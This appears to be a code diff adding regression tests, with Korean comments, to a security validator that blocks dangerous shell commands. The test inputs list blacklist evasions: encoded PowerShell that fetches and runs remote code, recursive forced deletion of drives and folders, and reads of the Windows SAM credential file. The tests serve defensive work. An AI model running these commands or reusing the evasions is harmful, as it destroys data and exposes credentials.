@@ -113,4 +113,67 @@ public class SecurityValidatorTests
 
         Assert.False(SecurityValidator.Validate(script, ScriptType.PowerShell).IsValid);
     }
+
+    // ── 회귀: 블랙리스트 우회 경로들 ──
+    //
+    // 아래는 모두 "차단된다고 문서에 적혀 있었지만 실제로는 통과하던" 입력이다.
+    // 각각 다른 우회 축을 대표한다: 셸 갈아타기 / 별칭 / 플래그 순서 / 경로 구분자.
+
+    /// <summary>
+    /// 셸 갈아타기 — CmdBlacklist 가 비어 있어서 cmd 로 powershell 을 부르면
+    /// PowerShell 블랙리스트가 통째로 무력화됐다.
+    /// </summary>
+    [Theory]
+    [InlineData("powershell -enc SQBFAFgAIAAoAGkAdwByACAAaAB0AHQAcAA6AC8ALwB4ACkA")]
+    [InlineData("powershell.exe -EncodedCommand SQBFAFgA")]
+    [InlineData("pwsh -e SQBFAFgA")]
+    [InlineData("powershell -Command \"Remove-Item C:\\ -Recurse\"")]
+    [InlineData("cmd /c del /f /q C:\\data")]
+    public void Validate_BlocksNestedShellEvasion(string script)
+    {
+        Assert.False(SecurityValidator.Validate(script, ScriptType.Cmd).IsValid);
+    }
+
+    /// <summary>Remove-Item 별칭 — 이름만 막아서 rm/ri/rd 는 그대로 통과했다.</summary>
+    [Theory]
+    [InlineData("rm -r -force C:\\data")]
+    [InlineData("ri -Recurse -Force C:\\data")]
+    [InlineData("rm -Force -Recurse C:\\data")]
+    public void Validate_BlocksRemoveItemAliases(string script)
+    {
+        Assert.False(SecurityValidator.Validate(script, ScriptType.PowerShell).IsValid);
+    }
+
+    /// <summary>플래그가 대상 뒤에 오는 형태 — `\bdel\s+/[fqs]` 는 이걸 놓쳤다.</summary>
+    [Theory]
+    [InlineData("del *.* /q")]
+    [InlineData("del important.txt /f")]
+    [InlineData("erase data.bin /q")]
+    public void Validate_BlocksDeleteWithTrailingFlags(string script)
+    {
+        Assert.False(SecurityValidator.Validate(script, ScriptType.Cmd).IsValid);
+    }
+
+    /// <summary>Windows 는 슬래시 경로도 받는다 — 역슬래시만 보던 규칙은 이를 놓쳤다.</summary>
+    [Theory]
+    [InlineData("type C:/Windows/System32/config/SAM")]
+    [InlineData("dir C:/Program Files")]
+    [InlineData("Get-Content $env:SystemRoot/System32/drivers/etc/hosts")]
+    public void Validate_BlocksSystemPathsWithForwardSlashes(string script)
+    {
+        Assert.False(SecurityValidator.Validate(script, ScriptType.PowerShell).IsValid);
+    }
+
+    /// <summary>과잉 차단 방지 — 평범한 명령은 계속 통과해야 한다.</summary>
+    [Theory]
+    [InlineData("dir")]
+    [InlineData("git status")]
+    [InlineData("npm run build")]
+    [InlineData("Get-ChildItem -Recurse")]          // -Force 없음 → 삭제 아님
+    [InlineData("del")]                              // 플래그 없음
+    [InlineData("echo powershell is a shell")]       // -enc/-command 없음
+    public void Validate_AllowsOrdinaryCommands(string script)
+    {
+        Assert.True(SecurityValidator.Validate(script, ScriptType.PowerShell).IsValid);
+    }
 }
